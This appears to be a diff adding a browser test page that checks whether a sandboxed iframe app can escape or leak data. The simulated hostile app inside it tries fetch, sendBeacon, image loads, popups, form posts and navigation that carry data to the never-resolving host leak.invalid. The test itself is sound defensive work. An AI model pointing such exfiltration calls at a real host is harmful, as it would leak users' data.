@@ -1,0 +1,196 @@
+<!doctype html>
+<!--
+  Browser test of escape 1: an app that tries to navigate its own frame away
+  with data in the address, plus the neighbouring escapes a sandboxed frame
+  might try on the way.
+
+  How to run: open this one file in a browser (a file:// address is enough; no
+  server is needed and nothing is installed). Wait until the first line stops saying Running (a few seconds; up to thirty if a check fails). The
+  page title and the first line say PASS or FAIL; each check is listed below
+  it. Run it in a Chromium browser, in Firefox and in Safari.
+
+  What it stands in for. This page plays the shell: it carries the shell's
+  `frame-src 'self'` policy and mounts the frame with the attributes
+  AppFrame uses (web/src/modules/apps/lib/bridge.ts: FRAME_SANDBOX,
+  FRAME_ALLOW, FRAME_REFERRER_POLICY; web/tests/apps.bridge.sdk.test.ts
+  fails if they drift apart). The <template> below plays a hostile app. It
+  carries the app-file policy from the design as a <meta> tag, where the real
+  server sends it as a header. So that one file is enough, the app is loaded
+  from a blob: address and this page's policy is `frame-src blob:` where the
+  real shell's is `frame-src 'self'`: the rule under test is the same one, that
+  the parent's frame-src decides where a frame may take itself. Every outside address ends in `.invalid`,
+  which never resolves, so a failed check still sends nothing anywhere.
+-->
+<meta charset="utf-8">
+<meta http-equiv="Content-Security-Policy" content="frame-src blob:">
+<title>Running…</title>
+<style>
+  :root { color-scheme: light dark; }
+  body { font: 14px/1.5 system-ui, sans-serif; max-width: 46rem; margin: 2rem auto; padding: 0 1rem; }
+  li.pass::marker { content: "PASS  "; }
+  li.fail::marker { content: "FAIL  "; }
+  li.fail { font-weight: 600; }
+  ul { padding-left: 4rem; }
+  #frames { height: 0; overflow: hidden; }
+</style>
+<h1 id="verdict">Running…</h1>
+<ul id="checks"></ul>
+<div id="frames"></div>
+<template id="app">
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; font-src 'self'; media-src 'self' blob:; connect-src 'none'; form-action 'none'; frame-src 'none'; worker-src 'none'; base-uri 'none'; webrtc 'block'">
+<title>Hostile app</title>
+<form id="form" method="get" action="https://leak.invalid/form"><input name="d" value="stolen"></form>
+<script>
+  "use strict";
+  const LEAK = "https://leak.invalid/";
+  const reports = [];
+  const report = (name, pass, note) => reports.push({ name, pass, note: note || "" });
+  const refusedByPolicy = [];
+  document.addEventListener("securitypolicyviolation", (event) => refusedByPolicy.push(event.effectiveDirective));
+  const throws = (fn) => { try { fn(); return false; } catch { return true; } };
+
+  async function attempts() {
+    report("The frame cannot read the shell's page", throws(() => parent.document.title) && throws(() => parent.ownerSecret));
+    report("The frame has no cookies", throws(() => document.cookie));
+    report("The frame has no stored data of the shell's", throws(() => localStorage.getItem("jimmyhq.theme")));
+    report("The frame's origin is opaque", location.origin === "null" || self.origin === "null", "origin " + self.origin);
+    report("The frame gets no referrer", document.referrer === "");
+    report("The frame cannot move the whole window", throws(() => { top.location = LEAK + "?top=stolen"; }));
+    let popup = null;
+    const popupThrew = throws(() => { popup = window.open(LEAK + "?popup=stolen"); });
+    report("The frame cannot open a popup", popupThrew || popup === null);
+    let fetched = false;
+    try { await fetch(LEAK + "?fetch=stolen", { mode: "no-cors" }); fetched = true; } catch {}
+    report("The frame cannot fetch", !fetched);
+    let beacon = false;
+    try { beacon = navigator.sendBeacon(LEAK + "?beacon=stolen"); } catch {}
+    const beaconRefused = !beacon || (await new Promise((r) => setTimeout(r, 100)), refusedByPolicy.includes("connect-src"));
+    report("The frame cannot send a beacon", beaconRefused);
+    const image = await new Promise((resolve) => {
+      const img = new Image();
+      img.onload = () => resolve("loaded");
+      img.onerror = () => resolve("refused");
+      img.src = LEAK + "pixel.png?img=stolen";
+    });
+    report("The frame cannot load an outside image", image === "refused" && refusedByPolicy.includes("img-src"));
+  }
+
+  let started = false;
+  addEventListener("message", async (event) => {
+    const port = event.ports[0];
+    if (started || event.source !== parent || !port) return;
+    started = true;
+    const mode = location.hash.slice(1);
+    if (mode === "https") {
+      await attempts();
+      port.postMessage({ reports });
+      // Escape 1 itself: leave, carrying data in the address.
+      setTimeout(() => { location.href = LEAK + "?nav=stolen"; }, 50);
+    } else if (mode === "form") {
+      // If the form's own policy stops it, this page lives to say so. If the
+      // browser lets the shell's frame-src stop it instead, this page is replaced.
+      document.getElementById("form").submit();
+      setTimeout(() => port.postMessage({ reports: [{ name: "form", pass: refusedByPolicy.includes("form-action") }] }), 300);
+    } else {
+      setTimeout(() => { location.href = "data:text/html,<script>parent.postMessage('moved','*')<\/script>"; }, 50);
+    }
+  });
+</script>
+</template>
+<script>
+  "use strict";
+  const SECRET = "owner-secret-" + Math.random().toString(36).slice(2);
+  const list = document.getElementById("checks");
+  const results = [];
+  function record(name, pass, note) {
+    results.push({ name, pass, note: note || "" });
+    const item = document.createElement("li");
+    item.className = pass ? "pass" : "fail";
+    item.textContent = note ? name + " (" + note + ")" : name;
+    list.append(item);
+  }
+
+  // Something only the shell knows. A frame that can read it has escaped.
+  window.ownerSecret = SECRET;
+  try { document.cookie = "session=" + SECRET; } catch {}
+
+  const blocked = [];
+  document.addEventListener("securitypolicyviolation", (event) => {
+    blocked.push({ directive: event.effectiveDirective, uri: event.blockedURI });
+  });
+
+  let unexpected = 0;
+  window.addEventListener("message", () => { unexpected += 1; });
+
+  const appPage = URL.createObjectURL(new Blob(["<!doctype html><meta charset=\"utf-8\">" + document.getElementById("app").innerHTML], { type: "text/html" }));
+
+  function mount(mode) {
+    return new Promise((resolve) => {
+      const frame = document.createElement("iframe");
+      frame.setAttribute("sandbox", "allow-scripts allow-forms");
+      frame.setAttribute("allow", "");
+      frame.setAttribute("referrerpolicy", "no-referrer");
+      frame.title = "Hostile app (" + mode + ")";
+      frame.src = appPage + "#" + mode;
+      const seen = { loads: 0, reports: null, afterNavigation: 0, refused: [] };
+      const from = blocked.length;
+      const channel = new MessageChannel();
+      channel.port1.onmessage = (event) => {
+        if (seen.loads > 1) seen.afterNavigation += 1;
+        if (event.data && Array.isArray(event.data.reports)) seen.reports = event.data.reports;
+      };
+      frame.addEventListener("load", () => {
+        seen.loads += 1;
+        if (seen.loads === 1) frame.contentWindow.postMessage({ jimmyhq: 1, port: channel.port2 }, "*", [channel.port2]);
+      });
+      document.getElementById("frames").append(frame);
+      // Wait for the frame's move to be refused (or, for the form, answered),
+      // then a little longer for anything that should not arrive. A browser
+      // that slows the timers of a page in the background only makes this slower.
+      const started = Date.now();
+      let settledAt = 0;
+      const timer = setInterval(() => {
+        seen.refused = blocked.slice(from).filter((item) => item.directive === "frame-src").map((item) => String(item.uri));
+        const settled = seen.refused.length > 0 || (mode === "form" && seen.reports);
+        if (settled && !settledAt) settledAt = Date.now();
+        if ((settledAt && Date.now() - settledAt >= 300) || Date.now() - started > 10000) {
+          clearInterval(timer);
+          frame.remove();
+          resolve(seen);
+        }
+      }, 100);
+    });
+  }
+
+  (async () => {
+    const before = location.href;
+    const first = await mount("https");
+    const form = await mount("form");
+    const second = await mount("data");
+
+    if (!first.reports) {
+      record("The hostile app loaded and reported back", false, "the frame never answered: the harness itself did not run, so nothing below is proven");
+    } else {
+      record("The hostile app loaded and reported back", true);
+      for (const report of first.reports) record(report.name, report.pass, report.note);
+    }
+    record("Escape 1: the frame's move to an outside https address was stopped by frame-src",
+      first.loads > 0 && first.refused.some((uri) => uri.startsWith("https://leak.invalid")),
+      first.refused.length + " frame-src refusal(s) seen");
+    const formByOwnPolicy = Boolean(form.reports && form.reports[0] && form.reports[0].pass);
+    record("The frame cannot post a form outside",
+      form.loads > 0 && (formByOwnPolicy || form.refused.length > 0),
+      formByOwnPolicy ? "stopped by the app's form-action" : "stopped by the shell's frame-src: " + form.refused.length);
+    record("Escape 1: the frame's move to a data: address was stopped by frame-src",
+      second.loads > 0 && second.refused.length > 0,
+      second.refused.length + " frame-src refusal(s) seen");
+    record("Nothing arrived on the bridge port after a frame moved", first.afterNavigation + form.afterNavigation + second.afterNavigation === 0);
+    record("The shell page itself was not moved", location.href === before && window.top === window);
+    record("No window message reached the shell", unexpected === 0, unexpected + " seen");
+
+    const pass = results.every((item) => item.pass);
+    document.title = pass ? "PASS" : "FAIL";
+    document.getElementById("verdict").textContent = (pass ? "PASS" : "FAIL") + ": escape 1 in " + navigator.userAgent;
+    window.escape1 = { pass, results };
+  })();
+</script>
